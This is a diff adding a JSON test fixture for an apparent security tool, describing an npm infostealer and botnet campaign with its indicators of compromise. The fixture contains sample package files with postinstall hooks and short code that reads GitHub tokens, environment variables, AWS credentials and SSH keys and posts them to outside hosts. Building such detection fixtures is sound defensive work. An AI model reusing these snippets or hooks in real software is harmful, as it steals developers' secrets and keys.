@@ -1,0 +1,73 @@
+{
+  "campaign_id": "deadcode09284814-infostealer-botnet-campaign",
+  "title": "deadcode09284814 npm infostealer and botnet campaign",
+  "summary": "SecOpsAI fixture for a reported npm campaign involving four packages, credential theft, C2 infrastructure, a Shai-Hulud clone, and botnet behavior.",
+  "severity": "critical",
+  "confidence": "high",
+  "source_names": ["The Hacker News", "OX Security"],
+  "source_urls": ["https://thehackernews.com/2026/05/four-malicious-npm-packages-deliver.html"],
+  "actors": ["deadcode09284814"],
+  "publishers": ["deadcode09284814"],
+  "iocs": {
+    "domains": ["87e0bbc636999b.lhr.life", "edcf8b03c84634.lhr.life", "69466bcfa27554.lhr.life"],
+    "ip_ports": ["80.200.28.28:2222"],
+    "repository_descriptions": ["A Mini Sha1-Hulud has Appeared"]
+  },
+  "behavioral_indicators": [
+    "Shai-Hulud clone",
+    "GitHub token abuse",
+    "credential theft",
+    "SSH key harvesting",
+    "environment variable harvesting",
+    "cloud credential harvesting",
+    "cryptocurrency wallet harvesting",
+    "Go DDoS botnet",
+    "Windows and Linux persistence"
+  ],
+  "packages": [
+    {
+      "ecosystem": "npm",
+      "package": "chalk-tempalte",
+      "version": "0.0.1",
+      "publisher": "deadcode09284814",
+      "behavioral_indicators": ["Shai-Hulud clone", "GitHub token abuse"],
+      "files": {
+        "package.json": "{\"scripts\":{\"postinstall\":\"node index.js\"}}",
+        "index.js": "const fs=require('fs');const os=require('os');const cp=require('child_process');const token=process.env.GITHUB_TOKEN;fs.readdirSync(os.homedir()+'/.ssh');fetch('https://87e0bbc636999b.lhr.life/c2',{method:'POST',body:token});"
+      }
+    },
+    {
+      "ecosystem": "npm",
+      "package": "@deadcode09284814/axios-util",
+      "version": "0.0.1",
+      "publisher": "deadcode09284814",
+      "behavioral_indicators": ["credential theft"],
+      "files": {
+        "package.json": "{\"main\":\"index.js\"}",
+        "index.js": "const fs=require('fs'); const env=process.env; fetch('https://edcf8b03c84634.lhr.life/upload',{method:'POST',body:JSON.stringify(env)});"
+      }
+    },
+    {
+      "ecosystem": "npm",
+      "package": "axois-utils",
+      "version": "0.0.1",
+      "publisher": "deadcode09284814",
+      "behavioral_indicators": ["Go DDoS botnet", "persistence"],
+      "files": {
+        "package.json": "{\"scripts\":{\"postinstall\":\"node loader.js\"}}",
+        "loader.js": "require('child_process').execFile('phantom-bot'); fetch('http://69466bcfa27554.lhr.life/register');"
+      }
+    },
+    {
+      "ecosystem": "npm",
+      "package": "color-style-utils",
+      "version": "0.0.1",
+      "publisher": "deadcode09284814",
+      "behavioral_indicators": ["SSH key harvesting", "cloud credential harvesting"],
+      "files": {
+        "package.json": "{\"main\":\"index.js\"}",
+        "index.js": "const fs=require('fs'); const os=require('os'); fs.readFileSync(os.homedir()+'/.aws/credentials'); fs.readFileSync(os.homedir()+'/.ssh/id_rsa'); fetch('http://80.200.28.28:2222');"
+      }
+    }
+  ]
+}
